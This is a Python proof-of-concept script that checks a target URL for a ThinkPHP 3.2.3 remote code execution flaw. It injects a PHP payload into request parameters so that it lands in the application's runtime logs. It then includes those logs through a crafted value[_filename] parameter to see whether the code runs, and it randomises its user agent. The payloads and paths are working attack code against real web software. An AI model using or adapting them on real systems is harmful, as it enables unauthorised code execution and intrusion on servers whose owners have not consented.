# Coding by Noel
# Date: 2021/8/6
# Version: Thinkphp 3.2.3
# Encoding utf-8
# Reference: https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ
#------------------------------------------------------------------

import re
import sys
import time
import datetime
import requests
from fake_useragent import UserAgent

#------------------------------------------------------------------
today = str(datetime.date.today())

poc1 = '/index.php?m=--><?=phpinfo();?>'  # ThinkPHP Debug Module = False
poc2 = '/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?>'	# ThinkPHP Debug Module = True
poc1_log = f'/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{today[2:4]}_{today.split("-")[1]}_{today.split("-")[2]}.log'
poc2_log = f'/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/{today[2:4]}_{today.split("-")[1]}_{today.split("-")[2]}.log'

headers = {
	'User-Agent':UserAgent().random,
}

re_title = re.compile(r'<title>(.*?)</title>')


def check_tp3_2_3_rce(url):
	print("[-]Now test poc1...")
	poc_check_1 = url + poc1
	try:
		res = requests.get(url=poc_check_1, headers=headers)
		#print(res.text)
		if res.status_code == 404 and re_title.findall(res.text)[0] == '系统发生错误' and "无法加载模块" in res.text:
			check_log(url, poc1_log)
	except :
		print("[-] Unknown error occurred...")
	
	time.sleep(1)
	print("[-]Now test poc2...")
	poc_check_2 = url + poc2
	try:
		res = requests.get(url=poc_check_2, headers=headers)
		if res.status_code == 200:
			check_log(url,poc2_log)
	except :
		print("[-] Unknown error occurred...")
	

def check_log(url, poc):
	poc_check_1_log = url + poc
	res_log = requests.get(url=poc_check_1_log, headers=headers)
	if res_log.status_code == 200:
		if "?=phpinfo();?" in res_log.text:
			print(f"[+] Target URL {url} log leaked...")
		elif re_title.findall(res_log.text)[0] == "phpinfo":
			print(f"[+] Target URL {url} exists ThinkPHP_3_2_3 log RCE...")
		else:
			print(f"Target URL {url} no vulnerability...")
	else:
		print(f"[-] Target URL no vulnerability...")
		

if __name__ == '__main__':
	target_url = sys.argv[1]
	check_tp3_2_3_rce(target_url)
